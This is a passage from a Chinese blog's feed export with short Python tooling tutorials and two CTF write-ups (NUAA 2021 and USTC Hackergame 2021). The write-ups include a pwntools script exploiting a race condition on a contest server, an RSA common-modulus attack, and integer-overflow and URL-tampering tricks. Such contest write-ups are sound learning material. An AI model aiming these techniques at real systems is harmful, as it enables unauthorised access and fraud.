href="https://book.douban.com/review/8506941/?dt_dapp=1&amp;qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">豆瓣 ciel丫丫</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><p>是否被拍成影视作品？（无）</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-jupyter-使用教程</title>
      <link href="/2022/01/17/Python-jupyter-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2022/01/17/Python-jupyter-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-安装"><a class="markdownIt-Anchor" href="#1-安装"></a> 1 安装</h1><p>打开cmd，使用pip进行安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install jupyterlab</span><br></pre></td></tr></table></figure><h1 id="2-使用"><a class="markdownIt-Anchor" href="#2-使用"></a> 2 使用</h1><p>cmd输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter-lab</span><br></pre></td></tr></table></figure><p>在浏览器输入：<a href="http://localhost:8888/" target="_blank" rel="noopener">http://localhost:8888/</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-matplotlib-使用简易教程</title>
      <link href="/2022/01/17/Python-matplotlib-%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
      <url>/2022/01/17/Python-matplotlib-%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-基础知识"><a class="markdownIt-Anchor" href="#1-基础知识"></a> 1 基础知识</h1><p><a href="https://matplotlib.org/stable/api/_as_gen/matplotlib.lines.Line2D.html" target="_blank" rel="noopener">官方文档</a></p><ul><li>画板figure，画纸Sublpot画质，可多图绘画</li><li>画纸上最上方是标题title，用来给图形起名字</li><li>坐标轴Axis，横轴叫x坐标轴label，纵轴叫y坐标轴ylabel</li><li>图例Legend 代表图形里的内容</li><li>网格Grid，图形中的虚线，True显示网格</li><li>点 Markers：表示点的形状。</li></ul><h1 id="2-绘图步骤"><a class="markdownIt-Anchor" href="#2-绘图步骤"></a> 2 绘图步骤</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入matplotlib的pyplot模块</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 基础绘图</span></span><br><span class="line"><span class="comment">#第1步：定义x和y坐标轴上的点   x坐标轴上点的数值</span></span><br><span class="line">x=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="comment">#y坐标轴上点的数值</span></span><br><span class="line">y=[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>]</span><br><span class="line"><span class="comment">#第2步：使用plot绘制线条第1个参数是x的坐标值，第2个参数是y的坐标值</span></span><br><span class="line">plt.plot(x,y)</span><br><span class="line"><span class="comment">#第3步：显示图形</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 定义绘图属性</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">color：线条颜色，值r表示红色（red）</span></span><br><span class="line"><span class="string">marker：点的形状，值o表示点为圆圈标记（circle marker）</span></span><br><span class="line"><span class="string">linestyle：线条的形状，值dashed表示用虚线连接各点</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">plt.plot(x, y, color=<span class="string">'r'</span>,marker=<span class="string">'o'</span>,linestyle=<span class="string">'dashed'</span>)</span><br><span class="line"><span class="comment">#plt.plot(x, y, 'ro')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">axis：坐标轴范围</span></span><br><span class="line"><span class="string">语法为axis[xmin, xmax, ymin, ymax]，</span></span><br><span class="line"><span class="string">也就是axis[x轴最小值, x轴最大值, y轴最小值, y轴最大值]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">20</span>])</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3 给图片提阿甲注释和标题等</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第1步：定义x和y坐标轴上的点  x坐标轴上点的数值</span></span><br><span class="line">x=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="comment">#y坐标轴上点的数值</span></span><br><span class="line">y=[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第2步：使用plot绘制线条 第1个参数是x的坐标值，第2个参数是y的坐标值</span></span><br><span class="line"><span class="comment"># 折线图</span></span><br><span class="line">plt.plot(x,y)</span><br><span class="line"><span class="comment"># 柱形图</span></span><br><span class="line"><span class="comment"># plt.barh(x,y)</span></span><br><span class="line"><span class="comment">#添加文本 #x轴文本</span></span><br><span class="line">plt.xlabel(<span class="string">'x坐标轴'</span>)</span><br><span class="line"><span class="comment">#y轴文本</span></span><br><span class="line">plt.ylabel(<span class="string">'y坐标轴'</span>)</span><br><span class="line"><span class="comment">#标题</span></span><br><span class="line">plt.title(<span class="string">'标题'</span>)</span><br><span class="line"><span class="comment">#添加注释 参数名xy：箭头注释中箭头所在位置，参数名xytext：注释文本所在位置，</span></span><br><span class="line"><span class="comment">#arrowprops在xy和xytext之间绘制箭头, shrink表示注释点与注释文本之间的图标距离</span></span><br><span class="line"></span><br><span class="line">plt.annotate(<span class="string">'我是注释'</span>, xy=(<span class="number">2</span>,<span class="number">5</span>), xytext=(<span class="number">2</span>, <span class="number">10</span>),</span><br><span class="line">            arrowprops=dict(facecolor=<span class="string">'black'</span>, shrink=<span class="number">0.01</span>),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="comment">#第3步：显示图形</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="3-多图绘制"><a class="markdownIt-Anchor" href="#3-多图绘制"></a> 3 多图绘制</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 柱形图</span></span><br><span class="line">fig, axs = plt.subplots(nrows=<span class="number">2</span>, ncols=<span class="number">2</span>, figsize=(<span class="number">20</span>, <span class="number">12</span>), dpi=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">0</span>][<span class="number">0</span>].set_title(<span class="string">'HeatLoadLight'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">0</span>].set_xlabel(<span class="string">'DateTime'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">0</span>].set_ylabel(<span class="string">'LoadValue'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">0</span>].bar(range(<span class="number">12</span>), list, fc=<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">0</span>][<span class="number">1</span>].set_title(<span class="string">'HeatLoadHeavy'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">1</span>].set_xlabel(<span class="string">'DateTime'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">1</span>].set_ylabel(<span class="string">'LoadValue'</span>)</span><br><span class="line">axs[<span class="number">0</span>][<span class="number">1</span>].bar(range(<span class="number">12</span>), list, fc=<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">1</span>][<span class="number">0</span>].set_title(<span class="string">'CoolLoadLight'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">0</span>].set_xlabel(<span class="string">'DateTime'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">0</span>].set_ylabel(<span class="string">'LoadValue'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">0</span>].bar(range(<span class="number">12</span>), list, fc=<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">1</span>][<span class="number">1</span>].set_title(<span class="string">'CoolLoadHeavy'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">1</span>].set_xlabel(<span class="string">'DateTime'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">1</span>].set_ylabel(<span class="string">'LoadValue'</span>)</span><br><span class="line">axs[<span class="number">1</span>][<span class="number">1</span>].bar(range(<span class="number">12</span>), list, fc=<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 折线图</span></span><br><span class="line">fig, axs = plt.subplots(nrows=<span class="number">1</span>, ncols=<span class="number">2</span>, figsize=(<span class="number">20</span>, <span class="number">6</span>), dpi=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">0</span>].set_title(<span class="string">'xxx'</span>)</span><br><span class="line">axs[<span class="number">0</span>].set_xlabel(<span class="string">'Hour'</span>)</span><br><span class="line">axs[<span class="number">0</span>].set_ylabel(<span class="string">'Value'</span>)</span><br><span class="line">axs[<span class="number">0</span>].plot(range(<span class="number">168</span>), Q_trans_light, c=<span class="string">'red'</span>, label=<span class="string">'Light'</span>)</span><br><span class="line">axs[<span class="number">0</span>].plot(range(<span class="number">168</span>), Q_trans_heavy, c=<span class="string">'blue'</span>, label=<span class="string">'Heavy'</span>)</span><br><span class="line">axs[<span class="number">0</span>].legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">axs[<span class="number">1</span>].set_title(<span class="string">"xxx"</span>)</span><br><span class="line">axs[<span class="number">1</span>].set_xlabel(<span class="string">'Hour'</span>)</span><br><span class="line">axs[<span class="number">1</span>].set_ylabel(<span class="string">'Value'</span>)</span><br><span class="line">axs[<span class="number">1</span>].plot(range(<span class="number">168</span>), Q_trans_light, c=<span class="string">'red'</span>, label=<span class="string">'Light'</span>)</span><br><span class="line">axs[<span class="number">1</span>].plot(range(<span class="number">168</span>), Q_trans_heavy, c=<span class="string">'blue'</span>, label=<span class="string">'Heavy'</span>)</span><br><span class="line">axs[<span class="number">1</span>].legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.runoob.com/matplotlib/matplotlib-bar.html" target="_blank" rel="noopener">菜鸟教程——Matplotlib 柱形图</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-文件-读取整理</title>
      <link href="/2022/01/17/Python-%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%8F%96%E6%95%B4%E7%90%86/"/>
      <url>/2022/01/17/Python-%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%8F%96%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-按行读取文本文件"><a class="markdownIt-Anchor" href="#1-按行读取文本文件"></a> 1 按行读取文本文件</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">with</span> open(file_path) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        print(line)</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/python-func-open.html" target="_blank" rel="noopener">open详解</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年nuaa校赛 WP</title>
      <link href="/2021/12/11/2021%E5%B9%B4NUAACTF%E6%A0%A1%E8%B5%9B-WP/"/>
      <url>/2021/12/11/2021%E5%B9%B4NUAACTF%E6%A0%A1%E8%B5%9B-WP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>官方wp：<a href="https://github.com/Asuri-Team/NUAACTF2021-Challenges/blob/main/WP.md" target="_blank" rel="noopener">链接</a></p></blockquote><h1 id="1-pwn"><a class="markdownIt-Anchor" href="#1-pwn"></a> 1 pwn</h1><h2 id="11-thread"><a class="markdownIt-Anchor" href="#11-thread"></a> 1.1 thread</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">Sale_Handler</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  balance += <span class="number">90</span> * Size;</span><br><span class="line">  result = sleep(<span class="number">0</span>);</span><br><span class="line">  Size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生产者-消费者问题，利用<code>Sale_Handler</code>函数中的<code>sleep</code>函数等待的漏洞，不断执行<code>Sale_Handler</code>函数，导致<code>balance</code>变量会累加。</p><p>执行脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = remote(<span class="string">'118.195.147.196'</span>, <span class="number">9231</span>)</span><br><span class="line"><span class="comment">#sh = process('./thread')</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.recvuntil(<span class="string">'it\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'buy?\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'10'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-misc"><a class="markdownIt-Anchor" href="#2-misc"></a> 2 Misc</h1><h2 id="21-baby_mix"><a class="markdownIt-Anchor" href="#21-baby_mix"></a> 2.1 baby_mix</h2><p>base16-》32-》58-》64</p><h2 id="22-questionnaire"><a class="markdownIt-Anchor" href="#22-questionnaire"></a> 2.2 questionnaire</h2><p>问卷</p><h2 id="23-我们生活在南京一穿越时空的电波"><a class="markdownIt-Anchor" href="#23-我们生活在南京一穿越时空的电波"></a> 2.3 我们生活在南京（一）——穿越时空的电波</h2><p>音频倒序，取单词首字母</p><h2 id="24-我们生活在南京二等幅电报"><a class="markdownIt-Anchor" href="#24-我们生活在南京二等幅电报"></a> 2.4 我们生活在南京（二）——等幅电报？</h2><p><strong>AudacityPortable</strong>打开文件，切换成频谱图，</p><p>转成摩斯电码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. .-.. .- --. -.-. .-- .. ..... ....- - .-. ....- -.. .. - .. ----- -. -- ...-- - .... ----- -..</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLAGCWI54TR4DITI0NM3TH0D</span><br><span class="line">//转小写</span><br><span class="line">flag&#123;cwi54tr4diti0nm3th0d&#125;</span><br></pre></td></tr></table></figure><h1 id="3-re"><a class="markdownIt-Anchor" href="#3-re"></a> 3 re</h1><h2 id="31-ida-start"><a class="markdownIt-Anchor" href="#31-ida-start"></a> 3.1 IDA Start</h2><p>IDA打开文件，<code>alt+t</code>搜索<code>flag</code></p><h1 id="4-crypto"><a class="markdownIt-Anchor" href="#4-crypto"></a> 4 crypto</h1><h2 id="41-checkin"><a class="markdownIt-Anchor" href="#41-checkin"></a> 4.1 checkin</h2><p>仿射密码，a=11, b=11</p><ul><li><a href="http://www.hiencode.com/affine.html" target="_blank" rel="noopener">http://www.hiencode.com/affine.html</a></li></ul><h2 id="42-easyrsa"><a class="markdownIt-Anchor" href="#42-easyrsa"></a> 4.2 easyRSA</h2><p>共模攻击模板题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, gcdext</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929</span></span><br><span class="line">e1 = <span class="number">17</span> <span class="comment">#填写e1</span></span><br><span class="line">e2 = <span class="number">65537</span> <span class="comment">#填写e2</span></span><br><span class="line"></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取密文</span></span><br><span class="line">file1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</span><br><span class="line">c1 = file1.read()</span><br><span class="line">c1 = s2n(c1)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">file2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</span><br><span class="line">c2 = file2.read()</span><br><span class="line">c2 = s2n(c2)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> (n2s(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中科大2021年Hackergame WP</title>
      <link href="/2021/10/30/%E4%B8%AD%E7%A7%91%E5%A4%A72021%E5%B9%B4Hackergame-WP/"/>
      <url>/2021/10/30/%E4%B8%AD%E7%A7%91%E5%A4%A72021%E5%B9%B4Hackergame-WP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-签到"><a class="markdownIt-Anchor" href="#1-签到"></a> 1 签到</h1><p>改变URL中的参数，使其在当前日期：<code>http://202.38.93.111:10000/?page=1635000000</code></p><img src="https://i.loli.net/2021/10/23/wxnQA8e1C6P2zK9.png" width="600" height="300" alt="图片名称" align="center" id="168"><h1 id="2-进制十六参上"><a class="markdownIt-Anchor" href="#2-进制十六参上"></a> 2 进制十六——参上</h1><p>使用文字识别工具识别十六进制串，转成字符串即可：<a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">https://www.bejson.com/convert/ox2str/</a></p><img src="https://i.loli.net/2021/10/23/tqYaVTK3URO1wDl.png" width="700" height="300" alt="图片名称" align="center" id="169"><h1 id="3-去吧追寻自由的电波"><a class="markdownIt-Anchor" href="#3-去吧追寻自由的电波"></a> 3 去吧！追寻自由的电波</h1><p>此mp3文件明显是加速处理后的文件，拖到Pr减速可以听到是一个一个的英语单词，根据前四个单词的首字母(f l a g)可以判定是取所有的首字母，左右花括号可以直译即可。</p><h1 id="4-猫咪问答-pro-max"><a class="markdownIt-Anchor" href="#4-猫咪问答-pro-max"></a> 4 猫咪问答 Pro Max</h1><ul><li>问题1：<a href="https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes" target="_blank" rel="noopener">https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes</a></li><li>问题2：<a href="https://lug.ustc.edu.cn/wiki/intro/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/intro/</a></li><li>问题3：<a href="https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/</a></li><li>问题4：<a href="http://sigbovik.org/2021/proceedings.pdf" target="_blank" rel="noopener">http://sigbovik.org/2021/proceedings.pdf</a></li><li>问题5：<a href="https://datatracker.ietf.org/doc/html/rfc8962" target="_blank" rel="noopener">https://datatracker.ietf.org/doc/html/rfc8962</a></li></ul><h1 id="5-卖瓜"><a class="markdownIt-Anchor" href="#5-卖瓜"></a> 5 卖瓜</h1><p>使用<code>9斤的瓜</code>凑，大数使其溢出为负数，然后获得商并使用其凑<code>9斤的瓜</code>。重复几次可以凑出来。</p><h1 id="6-透明的文件"><a class="markdownIt-Anchor" href="#6-透明的文件"></a> 6 透明的文件</h1><p>…</p><h1 id="7-旅行照片"><a class="markdownIt-Anchor" href="#7-旅行照片"></a> 7 旅行照片</h1><p>百度搜索<code>海边KFC</code>关键字，打开百度地图，根据海的位置确定方位，根据阴影判断是下午(两个选择爆破下)，题目3需要爆破，题目4和5根据百度搜索内容就可得到。</p><img src="https://i.loli.net/2021/10/23/ABcamulY4bJEHTt.png" width="600" height="300" alt="图片名称" align="center" id="170"><h1 id="8-flag-助力大红包"><a class="markdownIt-Anchor" href="#8-flag-助力大红包"></a> 8 FLAG 助力大红包</h1><p>…</p><h1 id="9-amnesia"><a class="markdownIt-Anchor" href="#9-amnesia"></a> 9 Amnesia</h1><h2 id="轻度失忆"><a class="markdownIt-Anchor" href="#轻度失忆"></a> 轻度失忆</h2><p>编译后 ELF 文件的 <code>.data</code> 和 <code>.rodata</code> 段会被清零。所以不能使用字符串赋值，putchar即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'H'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'e'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'l'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'l'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'o'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">','</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">    <span 